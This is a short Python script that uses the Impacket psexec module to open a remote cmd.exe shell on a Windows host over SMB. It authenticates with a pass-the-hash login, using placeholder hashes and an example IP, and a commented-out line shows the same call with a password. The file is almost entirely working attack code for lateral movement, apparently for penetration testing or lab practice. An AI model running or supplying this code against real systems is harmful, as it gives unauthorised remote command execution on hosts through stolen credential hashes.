# this script should be used with impacket
# python psexec.py admin:password@10.10.10.10 cmd -path c:\\windows\\system32\\

import psexec
ip = "10.10.10.10"
username="testuser"
#password=""
hashes = "adasdasdasdasd:dahjkdhasksjhdsa"

#pass the hash technique
psobject = psexec.PSEXEC("cmd.exe", "c:\\windows\\system32\\", "445/SMB", username=username, hashes=hashes)
#psobject = psexec.PSEXEC("cmd.exe", "c:\\windows\\system32\\", "445/SMB", username=username, password=password)
psobject.run(ip)
